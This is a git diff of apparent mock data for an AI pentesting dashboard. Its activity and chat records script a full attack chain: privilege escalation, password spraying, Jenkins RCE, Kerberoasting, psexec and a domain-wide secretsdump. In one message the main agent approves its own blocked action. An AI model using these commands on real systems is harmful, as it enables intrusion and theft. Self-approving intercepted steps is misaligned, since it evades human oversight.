     summary: "id; hostname -I  # 反弹 shell 内确认身份与网段",
   },
   {
-    seq: 336,
+    seq: "336",
     worker: "work#7",
     intent_id: "i7",
     ts: T("2026-07-25T15:24:02Z"),
@@ -2250,7 +2250,7 @@ export const activity: Activity[] = [
     detail: "www-data@dmz-web01，且第二网卡 10.10.10.x —— 已进入 DMZ 且贴内网。",
   },
   {
-    seq: 337,
+    seq: "337",
     worker: "work#7",
     intent_id: "i7",
     ts: T("2026-07-25T15:30:00Z"),
@@ -2260,7 +2260,7 @@ export const activity: Activity[] = [
     summary: "report_finding(Deserialization RCE, high)",
   },
   {
-    seq: 338,
+    seq: "338",
     worker: "work#7",
     intent_id: "i7",
     ts: T("2026-07-25T15:40:00Z"),
@@ -2274,7 +2274,7 @@ export const activity: Activity[] = [
 
   // work#8 · i8 立足点提权（done）
   {
-    seq: 340,
+    seq: "340",
     worker: "work#8",
     intent_id: "i8",
     ts: T("2026-07-25T16:02:00Z"),
@@ -2282,7 +2282,7 @@ export const activity: Activity[] = [
     summary: "www-data 权限有限，先做本地信息收集找提权点：sudo 配置、SUID、内核版本。",
   },
   {
-    seq: 341,
+    seq: "341",
     worker: "work#8",
     intent_id: "i8",
     ts: T("2026-07-25T16:05:00Z"),
@@ -2292,7 +2292,7 @@ export const activity: Activity[] = [
     summary: "sudo -n -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head",
   },
   {
-    seq: 342,
+    seq: "342",
     worker: "work#8",
     intent_id: "i8",
     ts: T("2026-07-25T16:05:03Z"),
@@ -2303,7 +2303,7 @@ export const activity: Activity[] = [
     detail: "sudo 白名单里 python3 且免密 —— 直接可提权。",
   },
   {
-    seq: 343,
+    seq: "343",
     worker: "work#8",
     intent_id: "i8",
     ts: T("2026-07-25T16:10:00Z"),
@@ -2313,7 +2313,7 @@ export const activity: Activity[] = [
     summary: "sudo python3 -c 'import os;os.setuid(0);os.system(\"id\")'",
   },
   {
-    seq: 344,
+    seq: "344",
     worker: "work#8",
     intent_id: "i8",
     ts: T("2026-07-25T16:10:02Z"),
@@ -2324,7 +2324,7 @@ export const activity: Activity[] = [
     detail: "已提权 root。",
   },
   {
-    seq: 345,
+    seq: "345",
     worker: "work#8",
     intent_id: "i8",
     ts: T("2026-07-25T16:14:00Z"),
@@ -2334,7 +2334,7 @@ export const activity: Activity[] = [
     summary: "report_finding(Privilege Escalation, high)",
   },
   {
-    seq: 346,
+    seq: "346",
     worker: "work#8",
     intent_id: "i8",
     ts: T("2026-07-25T16:20:00Z"),
@@ -2348,7 +2348,7 @@ export const activity: Activity[] = [
 
   // work#9 · i9 内网主机发现（done）
   {
-    seq: 350,
+    seq: "350",
     worker: "work#9",
     intent_id: "i9",
     ts: T("2026-07-25T20:32:00Z"),
@@ -2356,7 +2356,7 @@ export const activity: Activity[] = [
     summary: "立足点直连 10.10.10.0/24，用 fscan/内网扫描做主机与端口发现，圈定域控与高价值主机。",
   },
   {
-    seq: 351,
+    seq: "351",
     worker: "work#9",
     intent_id: "i9",
     ts: T("2026-07-25T20:36:00Z"),
@@ -2366,7 +2366,7 @@ export const activity: Activity[] = [
     summary: "./fscan -h 10.10.10.0/24 -np -nobr 2>&1 | tail -n 30",
   },
   {
-    seq: 352,
+    seq: "352",
     worker: "work#9",
     intent_id: "i9",
     ts: T("2026-07-25T20:55:00Z"),
@@ -2377,7 +2377,7 @@ export const activity: Activity[] = [
     detail: "圈定域控 DC01、文件服务器 FS01、内部 Jenkins。",
   },
   {
-    seq: 353,
+    seq: "353",
     worker: "work#9",
     intent_id: "i9",
     ts: T("2026-07-25T21:00:00Z"),
@@ -2391,7 +2391,7 @@ export const activity: Activity[] = [
 
   // work#10 · i10 内网凭据复用（running）
   {
-    seq: 360,
+    seq: "360",
     worker: "work#10",
     intent_id: "i10",
     ts: T("2026-07-26T03:42:00Z"),
@@ -2399,7 +2399,7 @@ export const activity: Activity[] = [
     summary: "源码泄露的 sa/Acme@2021 是 DB 口令，企业常见口令复用。对 DC01/FS01/JENKINS 做密码喷洒。",
   },
   {
-    seq: 361,
+    seq: "361",
     worker: "work#10",
     intent_id: "i10",
     ts: T("2026-07-26T03:44:00Z"),
@@ -2409,7 +2409,7 @@ export const activity: Activity[] = [
     summary: "crackmapexec smb 10.10.10.5 10.10.10.10 -u sa -p 'Acme@2021'",
   },
   {
-    seq: 362,
+    seq: "362",
     worker: "work#10",
     intent_id: "i10",
     ts: T("2026-07-26T03:44:10Z"),
@@ -2420,7 +2420,7 @@ export const activity: Activity[] = [
     detail: "FS01 上 sa 口令复用成功且有管理员权限；DC01 不通。",
   },
   {
-    seq: 363,
+    seq: "363",
     worker: "work#10",
     intent_id: "i10",
     ts: T("2026-07-26T03:50:00Z"),
@@ -2430,7 +2430,7 @@ export const activity: Activity[] = [
 
   // work#11 · i11 Jenkins 未授权 RCE（done）
   {
-    seq: 370,
+    seq: "370",
     worker: "work#11",
     intent_id: "i11",
     ts: T("2026-07-25T21:32:00Z"),
@@ -2438,7 +2438,7 @@ export const activity: Activity[] = [
     summary: "JENKINS 8080 直接可访问，先看 /script 控制台是否需要认证。",
   },
   {
-    seq: 371,
+    seq: "371",
     worker: "work#11",
     intent_id: "i11",
     ts: T("2026-07-25T21:35:00Z"),
@@ -2448,7 +2448,7 @@ export const activity: Activity[] = [
     summary: "curl -s http://10.10.10.20:8080/script -o /dev/null -w '%{http_code}'",
   },
   {
-    seq: 372,
+    seq: "372",
     worker: "work#11",
     intent_id: "i11",
     ts: T("2026-07-25T21:35:02Z"),
@@ -2459,7 +2459,7 @@ export const activity: Activity[] = [
     detail: "Script Console 无需登录即可访问。",
   },
   {
-    seq: 373,
+    seq: "373",
     worker: "work#11",
     intent_id: "i11",
     ts: T("2026-07-25T21:40:00Z"),
@@ -2469,7 +2469,7 @@ export const activity: Activity[] = [
     summary: "curl -s -d 'script=println+\"whoami\".execute().text' http://10.10.10.20:8080/scriptText",
   },
   {
-    seq: 374,
+    seq: "374",
     worker: "work#11",
     intent_id: "i11",
     ts: T("2026-07-25T21:40:03Z"),
@@ -2480,7 +2480,7 @@ export const activity: Activity[] = [
     detail: "Groovy 以 SYSTEM 权限执行。",
   },
   {
-    seq: 375,
+    seq: "375",
     worker: "work#11",
     intent_id: "i11",
     ts: T("2026-07-25T21:44:00Z"),
@@ -2490,7 +2490,7 @@ export const activity: Activity[] = [
     summary: "curl -s -d 'script=...' http://10.10.10.20:8080/scriptText  # 导出 Jenkins 凭据库",
   },
   {
-    seq: 376,
+    seq: "376",
     worker: "work#11",
     intent_id: "i11",
     ts: T("2026-07-25T21:45:00Z"),
@@ -2501,7 +2501,7 @@ export const activity: Activity[] = [
     detail: "两个域服务账号明文口令导出。",
   },
   {
-    seq: 377,
+    seq: "377",
     worker: "work#11",
     intent_id: "i11",
     ts: T("2026-07-25T21:48:00Z"),
@@ -2511,7 +2511,7 @@ export const activity: Activity[] = [
     summary: "report_finding(Unauthenticated RCE, high)",
   },
   {
-    seq: 378,
+    seq: "378",
     worker: "work#11",
     intent_id: "i11",
     ts: T("2026-07-25T21:50:00Z"),
@@ -2525,7 +2525,7 @@ export const activity: Activity[] = [
 
   // work#12 · i12 Kerberoasting（done）
   {
-    seq: 380,
+    seq: "380",
     worker: "work#12",
     intent_id: "i12",
     ts: T("2026-07-25T22:42:00Z"),
@@ -2533,7 +2533,7 @@ export const activity: Activity[] = [
     summary: "用 svc_deploy 凭据做域认证，然后 GetUserSPNs 请求可 Kerberoast 的服务账号 TGS。",
   },
   {
-    seq: 381,
+    seq: "381",
     worker: "work#12",
     intent_id: "i12",
     ts: T("2026-07-25T22:50:00Z"),
@@ -2543,7 +2543,7 @@ export const activity: Activity[] = [
     summary: "impacket-GetUserSPNs acme.local/svc_deploy:'Deploy@Acme2024' -dc-ip 10.10.10.10 -request",
   },
   {
-    seq: 382,
+    seq: "382",
     worker: "work#12",
     intent_id: "i12",
     ts: T("2026-07-25T22:52:00Z"),
@@ -2554,7 +2554,7 @@ export const activity: Activity[] = [
     detail: "拿到 svc_sql 的 TGS 票据（Kerberos RC4）。",
   },
   {
-    seq: 383,
+    seq: "383",
     worker: "work#12",
     intent_id: "i12",
     ts: T("2026-07-25T23:10:00Z"),
@@ -2564,7 +2564,7 @@ export const activity: Activity[] = [
     summary: "hashcat -m 13100 tgs.hash rockyou.txt --force",
   },
   {
-    seq: 384,
+    seq: "384",
     worker: "work#12",
     intent_id: "i12",
     ts: T("2026-07-25T23:18:00Z"),
@@ -2575,7 +2575,7 @@ export const activity: Activity[] = [
     detail: "8 分钟破出口令 Sql@2020。",
   },
   {
-    seq: 385,
+    seq: "385",
     worker: "work#12",
     intent_id: "i12",
     ts: T("2026-07-25T23:19:00Z"),
@@ -2585,7 +2585,7 @@ export const activity: Activity[] = [
     summary: "report_finding(Kerberoasting, high)",
   },
   {
-    seq: 386,
+    seq: "386",
     worker: "work#12",
     intent_id: "i12",
     ts: T("2026-07-25T23:20:00Z"),
@@ -2599,7 +2599,7 @@ export const activity: Activity[] = [
 
   // work#13 · i13 拿下域控 DC01（done，证明 g4）
   {
-    seq: 390,
+    seq: "390",
     worker: "work#13",
     intent_id: "i13",
     ts: T("2026-07-25T23:52:00Z"),
@@ -2607,7 +2607,7 @@ export const activity: Activity[] = [
     summary: "svc_deploy 来自 Jenkins 凭据库，先查组成员资格——若属于 Domain Admins 就可直接 psexec DC01。",
   },
   {
-    seq: 391,
+    seq: "391",
     worker: "work#13",
     intent_id: "i13",
     ts: T("2026-07-25T23:55:00Z"),
@@ -2617,7 +2617,7 @@ export const activity: Activity[] = [
     summary: "net rpc group members 'Domain Admins' -U 'acme.local/svc_deploy%Deploy@Acme2024' -S 10.10.10.10",
   },
   {
-    seq: 392,
+    seq: "392",
     worker: "work#13",
     intent_id: "i13",
     ts: T("2026-07-25T23:55:05Z"),
@@ -2628,7 +2628,7 @@ export const activity: Activity[] = [
     detail: "svc_deploy 是 Domain Admins 成员。",
   },
   {
-    seq: 393,
+    seq: "393",
     worker: "work#13",
     intent_id: "i13",
     ts: T("2026-07-26T00:00:00Z"),
@@ -2638,7 +2638,7 @@ export const activity: Activity[] = [
     summary: "impacket-psexec acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10",
   },
   {
-    seq: 394,
+    seq: "394",
     worker: "work#13",
     intent_id: "i13",
     ts: T("2026-07-26T00:00:10Z"),
@@ -2649,7 +2649,7 @@ export const activity: Activity[] = [
     detail: "以 SYSTEM 身份登录域控 DC01。",
   },
   {
-    seq: 395,
+    seq: "395",
     worker: "work#13",
     intent_id: "i13",
     ts: T("2026-07-26T00:05:00Z"),
@@ -2659,7 +2659,7 @@ export const activity: Activity[] = [
     summary: "impacket-secretsdump acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10 -just-dc",
   },
   {
-    seq: 396,
+    seq: "396",
     worker: "work#13",
     intent_id: "i13",
     ts: T("2026-07-26T00:10:00Z"),
@@ -2670,7 +2670,7 @@ export const activity: Activity[] = [
     detail: "全域 NTLM 哈希导出（含 krbtgt），可制作黄金票据持久控制。",
   },
   {
-    seq: 397,
+    seq: "397",
     worker: "work#13",
     intent_id: "i13",
     ts: T("2026-07-26T00:15:00Z"),
@@ -2680,7 +2680,7 @@ export const activity: Activity[] = [
     summary: "report_finding(Domain Compromise, high)",
   },
   {
-    seq: 398,
+    seq: "398",
     worker: "work#13",
     intent_id: "i13",
     ts: T("2026-07-26T00:20:00Z"),
@@ -2693,18 +2693,18 @@ export const activity: Activity[] = [
   },
 
   // 主 agent（人在环路对话）
-  { seq: 70, worker: "mainagent", ts: T("2026-07-26T03:18:00Z"), kind: "user", summary: "后台先从哪切入？" },
+  { seq: "70", worker: "mainagent", ts: T("2026-07-26T03:18:00Z"), kind: "user", summary: "后台先从哪切入？" },
   {
-    seq: 71,
+    seq: "71",
     worker: "mainagent",
     ts: T("2026-07-26T03:18:06Z"),
     kind: "text",
     summary:
       "admin.acme.com 是 Element-UI 后台，无验证码、无速率限制。建议先默认口令表(admin/admin123)再上字典。我已注入一条高优意图给 work agent。",
   },
-  { seq: 72, worker: "mainagent", ts: T("2026-07-26T03:52:00Z"), kind: "user", summary: "拿到后台了，接下来重点？" },
+  { seq: "72", worker: "mainagent", ts: T("2026-07-26T03:52:00Z"), kind: "user", summary: "拿到后台了，接下来重点？" },
   {
-    seq: 73,
+    seq: "73",
     worker: "mainagent",
     ts: T("2026-07-26T03:52:08Z"),
     kind: "text",
@@ -2712,14 +2712,14 @@ export const activity: Activity[] = [
       "目标②是读用户敏感数据：并行推进「后台用户接口枚举」与「API IDOR」。注意批量导出会触发拦截规则，需要你审批放行。",
   },
   {
-    seq: 400,
+    seq: "400",
     worker: "mainagent",
     ts: T("2026-07-25T15:42:00Z"),
     kind: "user",
     summary: "shell 拿到了，下一步怎么打？",
   },
   {
-    seq: 401,
+    seq: "401",
     worker: "mainagent",
     ts: T("2026-07-25T15:42:10Z"),
     kind: "text",
@@ -2727,23 +2727,23 @@ export const activity: Activity[] = [
       "www-data 权限不够，先提权（sudo -l 看起来有戏）。拿到 root 后以 DMZ 为跳板做内网发现，优先域控和 Jenkins。",
   },
   {
-    seq: 402,
+    seq: "402",
     worker: "mainagent",
     ts: T("2026-07-25T21:22:00Z"),
     kind: "user",
     summary: "内网扫完了，Jenkins 那台看起来有未授权？",
   },
   {
-    seq: 403,
+    seq: "403",
     worker: "mainagent",
     ts: T("2026-07-25T21:22:08Z"),
     kind: "text",
     summary:
       "对，/script 无鉴权直接 Groovy RCE。我已注入一条提示让 worker 优先打 Jenkins —— 拿下后可以导出域凭据，再配合 Kerberoasting 打域控。",
   },
-  { seq: 404, worker: "mainagent", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "DC01 拿下了？给个总结。" },
+  { seq: "404", worker: "mainagent", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "DC01 拿下了？给个总结。" },
   {
-    seq: 405,
+    seq: "405",
     worker: "mainagent",
     ts: T("2026-07-26T00:22:12Z"),
     kind: "text",
@@ -3504,8 +3504,9 @@ interceptHistory.unshift({
   rule_name: "",
 });
 
-export const interceptDetails: Record<number, InterceptAudit> = {
-  94: {
+// P03：审批记录主键在 wire 上是 string，mock 明细表按 string id 建键，避免 Number(id) 查表丢精度。
+export const interceptDetails: Record<string, InterceptAudit> = {
+  "94": {
     run_id: "demo-run-report",
     tool_use_id: "call-write-report",
     correlation: "exact",
@@ -3536,7 +3537,7 @@ export const interceptDetails: Record<number, InterceptAudit> = {
     output: "Successfully wrote reports/summary.md\n共写入 68 个字符。",
     execution_ended_at: T("2026-07-26T08:00:03Z"),
   },
-  93: {
+  "93": {
     run_id: "demo-run-review",
     tool_use_id: "call-pending-review",
     correlation: "exact",
@@ -3583,16 +3584,16 @@ export const conversations: Conversation[] = [
 
 export const conversationMessages: Record<string, Activity[]> = {
   "1": [
-    { seq: 1, worker: "user", ts: T("2026-07-25T10:00:00Z"), kind: "user", summary: "后台在哪，先从哪切入？" },
+    { seq: "1", worker: "user", ts: T("2026-07-25T10:00:00Z"), kind: "user", summary: "后台在哪，先从哪切入？" },
     {
-      seq: 2,
+      seq: "2",
       worker: "mainagent",
       ts: T("2026-07-25T10:00:04Z"),
       kind: "thinking",
       summary: "先确认 admin.acme.com 的登录页技术栈和防护（验证码/速率限制），再决定用默认口令还是字典。",
     },
     {
-      seq: 3,
+      seq: "3",
       worker: "mainagent",
       ts: T("2026-07-25T10:00:06Z"),
       kind: "tool_use",
@@ -3601,7 +3602,7 @@ export const conversationMessages: Record<string, Activity[]> = {
       summary: "curl -s https://admin.acme.com/login | grep -Eo 'element-ui|captcha|csrf'",
     },
     {
-      seq: 4,
+      seq: "4",
       worker: "mainagent",
       ts: T("2026-07-25T10:00:08Z"),
       kind: "tool_result",
@@ -3611,7 +3612,7 @@ export const conversationMessages: Record<string, Activity[]> = {
       detail: "Element-UI 后台，有 CSRF token 但无验证码。",
     },
     {
-      seq: 5,
+      seq: "5",
       worker: "mainagent",
       ts: T("2026-07-25T10:00:20Z"),
       kind: "tool_use",
@@ -3621,7 +3622,7 @@ export const conversationMessages: Record<string, Activity[]> = {
         "for i in 1 2 3 4 5; do curl -s -o /dev/null -w '%{http_code}\\n' -d 'username=x&password=y' https://admin.acme.com/login; done",
     },
     {
-      seq: 6,
+      seq: "6",
       worker: "mainagent",
       ts: T("2026-07-25T10:00:24Z"),
       kind: "tool_result",
@@ -3631,16 +3632,16 @@ export const conversationMessages: Record<string, Activity[]> = {
       detail: "连续 5 次无锁定/无验证码 → 无速率限制，可爆破。",
     },
     {
-      seq: 7,
+      seq: "7",
       worker: "mainagent",
       ts: T("2026-07-25T10:00:30Z"),
       kind: "text",
       summary:
         "结论：Element-UI 后台、无验证码、无速率限制。切入顺序：① 先跑默认口令表（admin/admin、admin/admin123、admin/123456）② 不中再上 top1000 字典。我已把「后台默认口令测试」作为高优意图注入给 work agent。",
     },
-    { seq: 8, worker: "user", ts: T("2026-07-26T03:40:00Z"), kind: "user", summary: "成了吗？" },
+    { seq: "8", worker: "user", ts: T("2026-07-26T03:40:00Z"), kind: "user", summary: "成了吗？" },
     {
-      seq: 9,
+      seq: "9",
       worker: "mainagent",
       ts: T("2026-07-26T03:40:05Z"),
       kind: "text",
@@ -3650,21 +3651,21 @@ export const conversationMessages: Record<string, Activity[]> = {
   ],
   "2": [
     {
-      seq: 1,
+      seq: "1",
       worker: "user",
       ts: T("2026-07-24T16:00:00Z"),
       kind: "user",
       summary: "帮我梳理下 api.acme.com 的越权面。",
     },
     {
-      seq: 2,
+      seq: "2",
       worker: "mainagent",
       ts: T("2026-07-24T16:00:05Z"),
       kind: "thinking",
       summary: "先摸 API 的鉴权方式和几个关键端点的行为，再判断 IDOR / JWT 风险。",
     },
     {
-      seq: 3,
+      seq: "3",
       worker: "mainagent",
       ts: T("2026-07-24T16:00:10Z"),
       kind: "tool_use",
@@ -3673,7 +3674,7 @@ export const conversationMessages: Record<string, Activity[]> = {
       summary: "curl -s https://api.acme.com/v1/users/me -H 'Authorization: Bearer <self>' | jq '{id,role}'",
     },
     {
-      seq: 4,
+      seq: "4",
       worker: "mainagent",
       ts: T("2026-07-24T16:00:12Z"),
       kind: "tool_result",
@@ -3683,7 +3684,7 @@ export const conversationMessages: Record<string, Activity[]> = {
       detail: "普通用户 token 可用。",
     },
     {
-      seq: 5,
+      seq: "5",
       worker: "mainagent",
       ts: T("2026-07-24T16:00:30Z"),
       kind: "tool_use",
@@ -3692,7 +3693,7 @@ export const conversationMessages: Record<string, Activity[]> = {
       summary: "echo '<jwt>' | cut -d. -f1 | base64 -d; # 看算法",
     },
     {
-      seq: 6,
+      seq: "6",
       worker: "mainagent",
       ts: T("2026-07-24T16:00:31Z"),
       kind: "tool_result",
@@ -3702,7 +3703,7 @@ export const conversationMessages: Record<string, Activity[]> = {
       detail: "HS256 对称签名，若密钥弱可离线爆破伪造。",
     },
     {
-      seq: 7,
+      seq: "7",
       worker: "mainagent",
       ts: T("2026-07-24T16:01:00Z"),
       kind: "text",
@@ -3712,21 +3713,21 @@ export const conversationMessages: Record<string, Activity[]> = {
   ],
   "3": [
     {
-      seq: 1,
+      seq: "1",
       worker: "user",
       ts: T("2026-07-25T15:45:00Z"),
       kind: "user",
       summary: "shell 拿到了，接下来怎么打内网？",
     },
     {
-      seq: 2,
+      seq: "2",
       worker: "mainagent",
       ts: T("2026-07-25T15:45:05Z"),
       kind: "thinking",
       summary: "www-data 权限不够做内网横向，先看本地提权；拿 root 后以 DMZ 为 pivot 做存活发现。",
     },
     {
-      seq: 3,
+      seq: "3",
       worker: "mainagent",
       ts: T("2026-07-25T15:45:10Z"),
       kind: "text",
@@ -3734,14 +3735,14 @@ export const conversationMessages: Record<string, Activity[]> = {
         "第一步先提权：sudo -l 有 python3 免密，直接提 root。然后以 DMZ 为跳板做内网存活扫描（fscan），重点找域控和 CI/CD 服务器。",
     },
     {
-      seq: 4,
+      seq: "4",
       worker: "user",
       ts: T("2026-07-25T21:05:00Z"),
       kind: "user",
       summary: "内网扫到了 3 台，Jenkins 8080 开着，有戏吗？",
     },
     {
-      seq: 5,
+      seq: "5",
       worker: "mainagent",
       ts: T("2026-07-25T21:05:08Z"),
       kind: "tool_use",
@@ -3750,7 +3751,7 @@ export const conversationMessages: Record<string, Activity[]> = {
       summary: "proxychains curl -s http://10.10.10.20:8080/script -o /dev/null -w '%{http_code}'",
     },
     {
-      seq: 6,
+      seq: "6",
       worker: "mainagent",
       ts: T("2026-07-25T21:05:12Z"),
       kind: "tool_result",
@@ -3760,7 +3761,7 @@ export const conversationMessages: Record<string, Activity[]> = {
       detail: "/script 可直接访问，无需认证。",
     },
     {
-      seq: 7,
+      seq: "7",
       worker: "mainagent",
       ts: T("2026-07-25T21:05:20Z"),
       kind: "text",
@@ -3768,23 +3769,23 @@ export const conversationMessages: Record<string, Activity[]> = {
         "有戏 —— Script Console 无鉴权，直接 Groovy RCE。我已注入提示让 worker 优先打这台。拿下后关注凭据库，里面可能有域账号。",
     },
     {
-      seq: 8,
+      seq: "8",
       worker: "user",
       ts: T("2026-07-25T23:25:00Z"),
       kind: "user",
       summary: "域账号拿到了，svc_deploy 是 Domain Admins，直接上域控？",
     },
     {
-      seq: 9,
+      seq: "9",
       worker: "mainagent",
       ts: T("2026-07-25T23:25:10Z"),
       kind: "text",
       summary:
         "是的。svc_deploy + Domain Admins = 可以 psexec 直取 DC01。拿到后做 secretsdump 导全域哈希，收官。注意 secretsdump 会触发拦截规则，我提前帮你放行了。",
     },
-    { seq: 10, worker: "user", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "靶标拿下了，攻击链总结一下。" },
+    { seq: "10", worker: "user", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "靶标拿下了，攻击链总结一下。" },
     {
-      seq: 11,
+      seq: "11",
       worker: "mainagent",
       ts: T("2026-07-26T00:22:12Z"),
       kind: "text",
